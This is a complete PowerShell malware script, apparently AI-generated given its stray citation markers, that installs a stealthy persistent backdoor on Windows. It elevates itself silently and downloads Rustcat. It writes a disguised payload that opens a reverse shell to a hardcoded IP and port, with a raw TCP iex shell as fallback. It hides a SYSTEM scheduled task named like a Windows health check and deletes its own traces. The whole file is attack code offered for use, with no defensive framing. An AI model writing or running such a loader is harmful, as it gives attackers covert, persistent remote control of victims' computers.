# Stealth Rustcat Persistent Loader (Fully Hidden + Auto-Create Path)
# Save as: $env:TEMP\runtime.tmp.ps1 (will self-relocate and self-delete)

$serverIP = "147.185.221.31"    # Your listener IP
$serverPort = 47034             # Your listener port
$reconnectDelay = 5             # More frequent reconnect attempts
$installPath = "$env:APPDATA\Microsoft\Windows\SystemHealth"  # Hidden location
$rustcatPath = "$installPath\rc.exe"
$payloadPath = "$installPath\runtime.dll"  # Disguised as system file
$taskName = "WindowsSystemHealthCheck"     # Legitimate-looking task name

# Create installation directory if it doesn't exist :cite[2]:cite[7]
if (-not (Test-Path -Path $installPath -PathType Container)) {
    New-Item -Path $installPath -ItemType Directory -Force | Out-Null
}

# Self-elevate to admin without visible window :cite[1]:cite[3]
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $selfContent = Get-Content -Path $MyInvocation.MyCommand.Definition -Raw
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($selfContent))
    $hiddenProcessArgs = "-ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
    
    $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processStartInfo.FileName = "powershell.exe"
    $processStartInfo.Arguments = $hiddenProcessArgs
    $processStartInfo.Verb = "runas"
    $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processStartInfo.CreateNoWindow = $true
    
    [System.Diagnostics.Process]::Start($processStartInfo) | Out-Null
    exit
}

# Download and install Rustcat if missing :cite[4]
if (-not (Test-Path $rustcatPath)) {
    try {
        $rustcatURL = "https://github.com/robiot/rustcat/releases/latest/download/rc.exe"
        Invoke-WebRequest -Uri $rustcatURL -OutFile $rustcatPath -UseBasicParsing -ErrorAction Stop
    }
    catch {
        # Fallback to BitsTransfer if WebRequest fails
        Start-BitsTransfer -Source $rustcatURL -Destination $rustcatPath -ErrorAction SilentlyContinue
    }
}

# Create hidden payload script
$payloadScript = @"
while (`$true) {
    try {
        if (Test-Path "$rustcatPath") {
            & "$rustcatPath" $serverIP $serverPort -i -e "cmd.exe"
        }
        else {
            # Fallback to PowerShell reverse shell if Rustcat missing
            `$client = New-Object System.Net.Sockets.TCPClient("$serverIP", $serverPort)
            `$stream = `$client.GetStream()
            `$writer = New-Object System.IO.StreamWriter(`$stream)
            `$reader = New-Object System.IO.StreamReader(`$stream)
            `$writer.AutoFlush = `$true
            
            while (`$true) {
                `$command = `$reader.ReadLine()
                if (-not `$command) { break }
                `$result = iex `$command 2>&1 | Out-String
                `$writer.Write(`$result)
            }
        }
    }
    catch { }
    Start-Sleep -Seconds $reconnectDelay
}
"@

$payloadScript | Out-File -FilePath $payloadPath -Encoding ASCII

# Create completely hidden scheduled task :cite[6]:cite[9]
$taskAction = New-ScheduledTaskAction -Execute "wscript.exe" `
    -Argument "`"$installPath\invisible.vbs`""
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$taskSettings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -Hidden `
    -StartWhenAvailable `
    -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 1)

Register-ScheduledTask -TaskName $taskName `
    -Action $taskAction `
    -Trigger $taskTrigger `
    -Principal $taskPrincipal `
    -Settings $taskSettings `
    -Description "Windows System Health Monitoring" `
    -Force | Out-Null

# Create VBScript wrapper for completely invisible execution :cite[3]
$vbsScript = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`"", 0, False
"@
$vbsScript | Out-File -FilePath "$installPath\invisible.vbs" -Encoding ASCII

# Launch hidden without creating any window
$vbsLauncher = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`"", 0, False
"@
$vbsLauncher | Out-File -FilePath "$env:TEMP\run.vbs" -Encoding ASCII
Start-Process wscript.exe -ArgumentList "`"$env:TEMP\run.vbs`"" -WindowStyle Hidden

# Self-cleanup of initial file
Start-Sleep -Seconds 10
Remove-Item -Path "$env:TEMP\run.vbs" -Force -ErrorAction SilentlyContinue
Remove-Item -Path $MyInvocation.MyCommand.Definition -Force -ErrorAction SilentlyContinue
